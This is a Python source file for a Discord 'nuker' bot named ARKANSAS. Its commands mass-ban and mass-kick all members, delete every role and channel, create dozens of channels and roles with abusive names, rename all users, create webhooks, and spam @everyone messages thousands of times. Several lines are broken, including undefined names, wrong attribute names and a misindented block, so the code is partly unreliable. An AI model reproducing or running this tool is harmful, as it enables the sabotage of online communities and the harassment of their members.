# NORMAL BOT VERSION OF ARKANSAS, THIS IS NOT A SELF BOT

version = "3.1b"

import os
from discord.ext import commands
from colorama import Fore
import random
import configfile as config
import sys


token = config.token
messages = config.messages
userid = config.userid
prefix = config.prefix


os.system("clear")
print(f"{Fore.RED}Loading...")

bot = commands.Bot(command_prefix=prefix)
bot.remove_command("help")


@bot.event
async def on_connect():
    os.system("clear")
    print(rf"""{Fore.RED}

                        ░█████╗░██████╗░██╗░░██╗░█████╗░███╗░░██╗░██████╗░█████╗░░██████╗
                        ██╔══██╗██╔══██╗██║░██╔╝██╔══██╗████╗░██║██╔════╝██╔══██╗██╔════╝
                        ███████║██████╔╝█████═╝░███████║██╔██╗██║╚█████╗░███████║╚█████╗░
                        ██╔══██║██╔══██╗██╔═██╗░██╔══██║██║╚████║░╚═══██╗██╔══██║░╚═══██╗
                        ██║░░██║██║░░██║██║░╚██╗██║░░██║██║░╚███║██████╔╝██║░░██║██████╔╝
                        ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═════╝░
                                                                                          
                                                                                          
                                                                                          
                                                            {Fore.RED}ARKANSAS
    """)
    print(f"{Fore.RED}                       ARKANSAS Version | {version}\n")
    print(f"{Fore.BLUE}           Permitted User ID | {userid}")
    print(f"{Fore.BLUE}                      Prefix | {prefix}\n\n")
    print(f"{Fore.BLUE}{prefix}ban - Bans all server members. **THIS IS VERY VERY SLOW**")
    print(f"{Fore.BLUE}{prefix}kick - Kicks all server members.")
    print(f"{Fore.BLUE}{prefix}role create - Creates 50 roles.")
    print(f"{Fore.BLUE}{prefix}role delete - Deletes all server roles.")
    print(f"{Fore.BLUE}{prefix}channel create - Creates 50 channels.")
    print(f"{Fore.BLUE}{prefix}channel delete - Deletes all server channels.")
    print(f"{Fore.BLUE}{prefix}GLORY_TO_ARKANSAS/nuke - Nukes the server.")
    print("")




    #Mass ban
    @bot.command()
    async def ban(ctx):
      if ctx.message.author.id == userid:
        await ctx.message.delete()
        print(f"{Fore.BLUE}Initiating...")
        print(f"{Fore.BLUE}Please wait...")
        for member in ctx.guild.members:
            try:
                await member.ban()
                print("Banned " + str(member))
            except:
                print("Unable to ban " + str(member) + ", you likely don't have permission.")
                pass
      else:
        pass

    #Mass kick
    @bot.command()
    async def kick(ctx):
      if ctx.message.author.id == userid:
        await ctx.message.delete()
        print(f"{Fore.BLUE}Initiating...")
        print(f"{Fore.BLUE}Please wait...")
        print(f"{Fore.RED}Kicking has begun.")
        for member in ctx.guild.members:
            try:
                await member.kick()
                print("Kicked " + str(member))
            except:
                print("Unable to kick " + str(member) + ", you likely don't have permission.")
                pass
      else:
        pass

    #Role deletion/Mass role creation
    @bot.command()
    async def role(ctx, choice):
      if ctx.message.author.id == userid:
          if choice == "create":
              await ctx.message.delete()
              print(f"{Fore.BLUE}Initiating...")
              print(f"{Fore.BLUE}Please wait...")
              print("Role creation has begun. Enjoy.")
              for i in range(1, 50):
                  try:
                      await ctx.guild.create_role(name="U mad bro?")
                  except:
                      print("Unable to make new channels, you likely don't have permission.")
          elif choice == "delete":
              await ctx.message.delete()
              print(f"{Fore.BLUE}Removing roles...")
              print(f"{Fore.BLUE}Please wait...")
              roles = ctx.guild.roles
              roles.pop(0)
              for role in roles:
                  try:
                      await role.delete()
                      print("Deleted " + str(role) + ".")
                  except:
                      print("Unable to delete " + str(role) + ", you likely don't have permission.")
                      pass
          else:
              await print("Not a valid option.")
      else:
          pass

    #Mass rename
    @bot.command()
    async def rename(ctx, rename_to):
      if ctx.message.author.id == userid:
          await ctx.message.delete()
          for user in list(ctx.guild.members):
              try:
                  await user.edit(nick=rename_to)
                  print(f"{user.name} has been renamed to {rename_to}.")
              except:
                  print(f"{user.name} has not been renamed to {rename_to}, you likely don't have permission.")
      else:
        pass

    #Channel deletion/Mass creation
    @bot.command()
    async def channel(ctx, choice):
      if ctx.message.author.id == userid:
          if choice == "create":
              await ctx.message.delete()
              print(f"{Fore.BLUE}Creating channels...")
              print(f"{Fore.BLUE}Please wait....")
              try:
                  for i in range(1, 50):
                      await ctx.guild.create_text_channel(name="HAHAHHAHAHA")
                      await ctx.guild.create_voice_channel(name="HAHAHAHAHHAHA")
              except:
                  print("Unable to create channels, you likely don't have permission.")
          elif choice == "delete":
              await ctx.message.delete()
              print(f"{Fore.BLUE}Deleting channels...")
              print(f"{Fore.BLUE}Please wait...")
              print("Channel deletion has begun.")
              for channel in ctx.guild.channels:
                  try:
                      await channel.delete()
                      print("Deleted " + str(channel) + ".")
                  except:
                      print(f"{Fore.RED}Unable to delete "+str(channel)+", you likely don't have permission.")
                      pass
              print("Finished deleting channels.")
          else:
              print(f"{Fore.RED}Not a valid option.")
      else:
          pass



    #Nuke
    @bot.command(aliases=["GLORY_TO_ARKANSAS"])
    async def nuke(ctx):
      if ctx.message.author.id == userid:
          await ctx.message.delete()
          print(f"{Fore.RED}Here we go.")
          print("")
          print(f"{Fore.RED}Banning has begun.")
          print("")
          
          # banning is disabled on this version because bots have very high rate limits for banning members
            
          for member in ctx.guild.members:
              try:
                  await member.kick()
                  print(f"Kicked {member}")
              except:
                print(f"Unable to kick {member}.")
                pass

          print("Kicking finished.")

          print(f"{Fore.RED}Role deletion has begun.")
          print("")
          roles = ctx.guild.roles
          roles.pop(0)
          for role in roles:
              try:
                  await role.delete()
                  print("Deleted " + str(role) + ".")
              except:
                  print("Unable to delete " + str(role) + ", you likely don't have permission.")
                  pass
          print(f"{Fore.GREEN}Role deletion has finished.\n")
          print(f"{Fore.RED}Mass role and channel creation has begun.\n")

          #Deletes channels

          print(f"{Fore.RED}Channel deletion has begun.\n")
          for channel in ctx.guild.channels:
              try:
                  await channel.delete()
                  print("Deleted " + str(channel) + ".")
              except:
                  pass
                  print("Unable to delete " + str(channel) + ", you likely don't have permission.")
          print(f"{Fore.GREEN}Channel deletion has finished.\n")


          for i in range(30):
              try:
                  await ctx.guild.create_text_channel(name="GET FUCKED HAHAHAHAHA")
                  await ctx.guild.create_voice_channel(name="GET FUCKED HAHAHAHAHHA")
                  await ctx.guild.create_role(name="FUCK YOU HAHAHAHHAHA")
              except:
                  print("Unable to create roles, you likely don't have permission.")
          print("Mass channel creation has finished.")

          try:
              await ctx.guild.edit(name=conf.servername)
              with open('icon.png', 'rb') as f:
                  icon = f.read()
                  await ctx.guild.edit(icon=icon)
          except:
              print("Unable to edit server.")


          for channel in list(ctx.message.guild.textchannels):
              webhook = await channel.create_webhook(name = "nuked")
              webhook_url = webhook.url
              hooks += [webhook_url]

              original_stdout = sys.stdout
              with open('hooks.txt', 'w') as f:
              sys.stdout = f
              print(hooks)
              sys.stdout = original_stdout
          
          
          for channel in ctx.guild.textchannels:
            for x in range(100):
                try:
                    await channel.send("@everyone"+random.choice(messages))
                except:
                  pass

          for x in range(3500):
            try:
                channel = random.choice(ctx.guild.textchannels)
                await channel.send("@everyone"+random.choice(messages))
            except:
                pass

          print("Nuke complete.")
      
      else:
          pass


    
    @bot.command(aliases=["commands"])
    async def help(ctx):
        if ctx.message.author.id == userid:
          await ctx.message.delete()
          print(f"{Fore.BLUE}{prefix}ban - Bans all server members.")
          print(f"{Fore.BLUE}{prefix}kick - Kicks all server members.")
          print(f"{Fore.BLUE}{prefix}role create - Creates 50 roles.")
          print(f"{Fore.BLUE}{prefix}role delete - Deletes all server roles.")
          print(f"{Fore.BLUE}{prefix}channel create - Creates 50 channels.")
          print(f"{Fore.BLUE}{prefix}channel delete - Deletes all server channels.")
          print(f"{Fore.BLUE}{prefix}GLORY_TO_ARKANSAS/nuke - Nukes the server. \n")
        else:
            pass


bot.run(token)
